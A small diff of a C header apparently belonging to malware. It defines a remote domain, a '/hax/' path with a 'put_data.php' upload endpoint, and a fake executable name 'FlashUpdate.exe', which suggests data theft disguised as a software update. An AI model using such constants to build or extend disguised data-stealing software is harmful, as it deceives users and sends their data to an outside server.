@@ -1,7 +1,9 @@
 #pragma once
 
-#define V_NET_FILE_DATA "/hax/put_data.php"
 #define V_NET_DOMAIN "einbaum.org"
+#define V_NET_BASE "/hax/"
+
+#define V_NET_FILE_DATA "put_data.php"
 
 
 #define V_FAKE_NAME1 _T("FlashUpdate.exe")
